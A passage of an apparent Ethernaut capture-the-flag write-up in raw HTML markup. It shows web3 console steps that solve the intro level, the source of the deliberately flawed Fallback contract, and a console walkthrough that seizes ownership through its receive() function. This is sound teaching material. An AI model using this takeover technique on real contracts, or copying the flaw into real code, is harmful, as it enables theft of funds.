&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;words&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;42&lt;&#x2F;span&gt;&lt;span&gt;]}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;info42&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;theMethodName is the name of the next method.&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;theMethodName&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;The method name is method7123949.&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;method7123949&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;If you know the password, submit it to authenticate().&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;ethernaut0&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;authenticate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;ethernaut0&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;solidity source:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Instance &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string public&lt;&#x2F;span&gt;&lt;span&gt; password;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint8 public&lt;&#x2F;span&gt;&lt;span&gt; infoNum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;42&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string public&lt;&#x2F;span&gt;&lt;span&gt; theMethodName &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;The method name is method7123949.&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool private&lt;&#x2F;span&gt;&lt;span&gt; cleared &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; constructor
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;_password) {
&lt;&#x2F;span&gt;&lt;span&gt;    password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _password;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;info&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public pure &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt; memory) {
&lt;&#x2F;span&gt;&lt;span&gt;    return &amp;#39;You will find what you need in info1().&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;info1&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public pure &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt; memory) {
&lt;&#x2F;span&gt;&lt;span&gt;    return &amp;#39;Try info2(), but with &amp;quot;hello&amp;quot; as a parameter.&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;info2&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;param) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public pure &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt; memory) {
&lt;&#x2F;span&gt;&lt;span&gt;    if(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(param)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;hello&amp;#39;))) {
&lt;&#x2F;span&gt;&lt;span&gt;      return &amp;#39;The property infoNum holds the number of the next info method to call.&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    return &amp;#39;Wrong parameter.&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;info42&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public pure &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt; memory) {
&lt;&#x2F;span&gt;&lt;span&gt;    return &amp;#39;theMethodName is the name of the next method.&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;method7123949&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public pure &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt; memory) {
&lt;&#x2F;span&gt;&lt;span&gt;    return &amp;#39;If you know the password, submit it to authenticate().&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;authenticate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;string memory &lt;&#x2F;span&gt;&lt;span&gt;passkey) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    if(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(passkey)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(password))) {
&lt;&#x2F;span&gt;&lt;span&gt;      cleared &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getCleared&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    return cleared;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;fallback&quot;&gt;Fallback&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Fallback &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; contributions;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    contributions[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 ether&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        require(
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; owner,
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;caller is not the owner&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contribute&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.001 ether&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    contributions[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    if(contributions[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; contributions[owner]) {
&lt;&#x2F;span&gt;&lt;span&gt;      owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getContribution&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    return contributions[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;];
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(owner).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).balance);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  receive() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value &amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; contributions[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;There are two function could be used claim ownership of the contract. Since the original owner have 1000 wei in wallet, the function &lt;code&gt;contribute()&lt;&#x2F;code&gt;was hard to exploit. But requirement of &lt;code&gt;receive()&lt;&#x2F;code&gt;could easily be satisfied by using &lt;code&gt;contribute()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; need to refer to the API documentation of web3.js https:&#x2F;&#x2F;web3js.readthedocs.io&#x2F;en&#x2F;v1.10.0&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;contribute&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendTransaction&lt;&#x2F;span&gt;&lt;span&gt;({from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;toWei&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0.0009&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)})
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x8868e98a26a35a88c57d2cadf24f40fb505a8b18b9bc047b9ca307fea4964068&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;receipt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{…}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;logs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Array&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendTransaction&lt;&#x2F;span&gt;&lt;span&gt;({from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;toWei&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0.00001&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)})
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x4f13c20bdb389b3901633d1665c466f48795f3e05f0a31e68f57135b512333e5&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;player
